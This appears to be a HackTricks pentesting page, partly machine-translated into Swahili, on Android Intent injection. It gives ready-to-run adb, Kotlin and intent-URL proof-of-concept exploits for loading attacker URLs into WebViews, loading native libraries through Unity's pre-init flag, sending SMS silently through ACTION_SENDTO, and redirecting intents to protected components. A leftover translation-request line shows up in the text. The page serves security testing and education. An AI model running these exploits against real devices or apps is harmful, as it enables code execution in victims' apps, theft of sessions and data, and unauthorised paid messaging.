# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection hutumia komponenti zinazonakili Intents zinazodhibitiwa na mshambuliaji au data ambayo baadaye hubadilishwa kuwa Intents. Mifumo miwili inayojitokeza sana wakati wa Android app pentests ni:

- Kupitisha crafted extras kwa exported Activities/Services/BroadcastReceivers ambazo baadaye zinaendelea kwenda kwa privileged, non-exported components.
- Kuzindua exported VIEW/BROWSABLE deep links ambazo zinafoward attacker-controlled URLs ndani ya internal WebViews au sinks nyingine nyeti.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
na Activity inayoipokea inapitisha parameter ya query `url` ndani ya WebView, unaweza kulazimisha app kuonyesha maudhui yoyote ya mbali katika muktadha wake wa WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Athari
- HTML/JS inatekelezwa ndani ya profaili ya WebView ya app.
- Ikiwa JavaScript imewezeshwa (kwa default au kutokana na ukaguzi uliopangwa vibaya), unaweza kuorodhesha/ kutumia chochote `@JavascriptInterface` kilicho wazi, kuiba WebView cookies/local storage, na pivot.

Tazama pia:

{{#ref}}
webview-attacks.md
{{#endref}}

## Hitilafu ya mpangilio wa ukaguzi inayowezesha JavaScript

Hitilafu inayojirudia ni kuwezesha JavaScript (au mipangilio mingine ya WebView inayoruhusu) kabla ya orodha ya kuruhusu/uthibitisho ya URL ya mwisho kukamilika. Ikiwa helper za awali zinakubali deep link yako na WebView inasanidiwa kwanza, upakiaji wako wa mwisho hufanyika JavaScript ikiwa tayari imewezeshwa hata kama ukaguzi wa baadaye uko na dosari au umechelewa.

Jitazame nini katika code iliyodecompiled:
- Msaada/handlers kadhaa zinazochambua/gawa/jenga upya URL kwa njia tofauti (normalization isiyotegemewa).
- Miito ya `getSettings().setJavaScriptEnabled(true)` kabla ya ukaguzi wa mwisho wa host/path kwenye allowlist.
- Mchakato kama: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Apps za Android zinazoendeshwa na Unity kawaida hutumia `com.unity3d.player.UnityPlayerActivity` (au `UnityPlayerGameActivity`) kama Activity ya kuingia. Template ya Android ya Unity inachukulia extra maalum ya Intent inayojulikana kama `unity` kama mnyororo wa flags za command-line kwa Unity runtime. Wakati Activity ya kuingia ime-export (default katika templates nyingi), app yoyote ya eneo – na wakati mwingine tovuti ikiwa `BROWSABLE` ipo – inaweza kutoa extra hii.

Flag hatari, isiyoelezewa hupelekea utekelezaji wa native code wakati wa hatua za mwanzo sana za initialization ya process:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Athari: `dlopen(<absolute-path>, RTLD_NOW)` mapema mno katika init, ikipakia ELF inayodhibitiwa na mshambuliaji ndani ya process ya app lengwa kwa UID na ruhusa zake.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Kwa nini inafanya kazi
- The Intent extra `unity` hutafsiriwa kuwa Unity runtime flags.
- Kuwasilisha pre-init flag kunaelekeza Unity kwenye ELF path inayodhibitiwa na mshambulizi ndani ya allowed linker namespace path (tazama vikwazo hapa chini).

Conditions for exploitation
- The Unity entry Activity is exported (kawaida ni kweli kwa chaguo-msingi).
- For one-click remote via browser: the entry Activity also declares `android.intent.category.BROWSABLE` so extras can be passed from an `intent:` URL.

Local exploitation (same device)
1) Weka payload ELF kwenye path inayoweza kusomwa na app ya mwathiriwa. Rahisi zaidi: tuma maktaba haribifu katika app yako ya mshambulizi na hakikisha inatolewa chini ya `/data/app/.../lib/<abi>/` kwa kuweka kwenye manifest ya mshambulizi:
```xml
<application android:extractNativeLibs="true" ...>
```
2) Zindua activity ya Unity ya mwathiri kwa kutumia CLI pre-init flag katika `unity` extra. Mfano wa ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity inaita `dlopen("/data/.../libpayload.so", RTLD_NOW)`; payload yako inaendesha ndani ya mchakato wa mwathiriwa, ikirithi ruhusa zote za app yake (camera/mic/network/storage, n.k.) na ufikiaji wa vikao/data ndani ya app.

Vidokezo
- Njia halisi ya `/data/app/...` hubadilika kati ya vifaa/usakinishaji. An attacker app inaweza kupata native lib dir yake wakati wa runtime kupitia `getApplicationInfo().nativeLibraryDir` na kuwasilisha kwa trigger.
- Faili haijalazimika kumalizika na `.so` ikiwa ni ELF halali – `dlopen()` inazingatia vichwa vya ELF, si viambatisho.

One‑click ya mbali kupitia kivinjari (kwa masharti)
Ikiwa Unity entry activity ime-exported na `BROWSABLE`, tovuti inaweza kupitisha extras kupitia URL ya `intent:`:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Hata hivyo, kwenye Android za kisasa dynamic linker namespaces na SELinux zinazuia upakiaji kutoka katika njia nyingi za umma (mfano, `/sdcard/Download`). Utaona makosa yafuatayo:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: target apps that cache attacker-controlled bytes under their private storage (e.g., HTTP caches). Because permitted paths include `/data` and the app’s private dir, pointing `-xrsdk-pre-init-library` at an absolute path inside the app’s cache can satisfy linker constraints and yield code execution. This mirrors prior cache-to-ELF RCE patterns experienced in other Android apps.


## Confused‑Deputy: SMS/MMS kimya kupitia ACTION_SENDTO (Wear OS Google Messages)

Baadhi ya default messaging apps zinaendesha implicit messaging intents moja kwa moja kwa upotovu, zikibadilisha kuwa primitive ya confused‑deputy: app yoyote isiyo na haki inaweza kusababisha Intent.ACTION_SENDTO na `sms:`, `smsto:`, `mms:`, au `mmsto:` na kusababisha kutumwa mara moja bila UI ya uthibitisho na bila ruhusa ya `SEND_SMS`.

Mambo muhimu
- Kichocheo: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: weka mpokeaji katika URI, maandishi ya ujumbe katika extra `"sms_body"`.
- Ruhusa: hakuna (hakuna `SEND_SMS`), inategemea default SMS/MMS handler.
- Imeonekana: Google Messages for Wear OS (patched May 2025). Handler nyingine zinapaswa kutathminiwa kwa njia ile ile.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (hakuna ruhusa maalum)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Attack surface expansion (Wear OS)
- Kila component inayoweza kuzindua activities inaweza kutuma payload ile ile: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- Ikiwa default handler inatuma kiotomatiki, matumizi mabaya yanaweza kuwa one‑tap au kimya kabisa kutoka muktadha wa background kulingana na sera za OEM.

Pentest checklist
- Fufua `ACTION_SENDTO` kwenye lengo ili kubaini default handler; thibitisha ikiwa inaonyesha UI ya kuunda (compose) au inatuma kimya.
- Jaribu skimu zote nne (`sms:`, `smsto:`, `mms:`, `mmsto:`) na extras (`sms_body`, hiari `subject` kwa MMS) ili kuangalia tofauti za tabia.
- Zingatia maeneo yanayolipishwa/premium‑rate numbers unapofanya majaribio kwenye vifaa halisi.


## Other classic Intent injection primitives

- startActivity/sendBroadcast ikitumia attacker-supplied `Intent` extras ambazo baadaye zinare-parse (`Intent.parseUri(...)`) na kutekelezwa.
- Exported proxy components ambazo zinafanya forward ya Intents kwa non-exported sensitive components bila ukaguzi wa ruhusa.

---

## Automating exported-component testing (Smali-driven ADB generation)

Wakati exported components zinatarajia extras maalum, kubashiri muundo wa payload kunasababisha kupoteza muda na false negatives. Unaweza kuotomatisha ugunduzi wa keys/types moja kwa moja kutoka Smali na kutoa amri za adb tayari-kukimbia.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile na scan Smali kwa ajili ya calls kama `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` ili kubaini ni extras na fields gani zinatumiwa na kila component.
- Matokeo: kwa kila exported Activity/Service/Receiver/Provider, tool inachapisha ufafanuzi mfupi na amri kamili `adb shell am ...`/`cmd content ...` yenye flags zilizo na aina sahihi.

Sakinisha
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Matumizi
```bash
python apk-components-inspector.py target.apk
```
Please provide the content of src/mobile-pentesting/android-app-pentesting/intent-injection.md that you want translated to Swahili.
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras — mwongozo mfupi (bendera zinazoangalia aina)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Vidokezo vya kitaalamu kwa Providers
- Tumia `adb shell cmd content query|insert|update|delete ...` kufikia ContentProviders bila agents.
- Kwa uchunguzi wa SQLi, badilisha `--projection` na `--where` (aka selection) wakati provider wa msingi anafuata SQLite.

Automatiki ya mchakato kamili (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Skripti ya msaada ya kuchanganua na kutekeleza amri za adb</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Endesha kwenye kifaa: inspekta imeandikwa kwa Python na inafanya kazi katika Termux au simu zilizo root ambapo `apktool`/`androguard` zinapatikana.

---

## Intent Redirection (CWE-926) – kutafuta na kutumia

Mfano
- Sehemu iliyohamishwa ya kuingia (Activity/Service/Receiver) husoma Intent inayoingia na kuipitisha ndani au nje bila kuthibitisha chanzo/data, kwa mfano:
- `startActivity(getIntent())`
- `startActivity(intent)` ambako `intent` ilitokana na extra kama `redirect_intent`/`next_intent`/`pending_intent` au `Intent.parseUri(...)`.
- Kuamini viwanja vya `action`/`data`/`component` bila ukaguzi; kutothibitisha utambulisho wa mtumaji.

Nini cha kutafuta katika Smali/Java
- Matumizi ya `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Matumizi ya moja kwa moja ya `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` kwenye Intents zilizodhibitiwa na attacker.
- Ukosefu wa ukaguzi wa `getCallingPackage()`/`getCallingActivity()` au vizingiti vya ruhusa maalum.

Violezo vya PoC vya ADB
- Proxy Activity inayowasilisha extra Intent kwa Activity ya ndani yenye ruhusa:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service inayeheshimu parcelable ya `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Mpokeaji uliotolewa anayepitisha bila uthibitisho:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Bendera zinazosaidia tabia ya singleTask-style
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Mifano ya ulimwengu halisi (athari zinatofautiana):
- CVE-2024-26131 (Element Android): exported flows zinazosababisha WebView manipulation, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → athari za ngazi ya mfumo.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access (na mwingiliano wa mtumiaji).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak maudhui.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Marejeleo

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
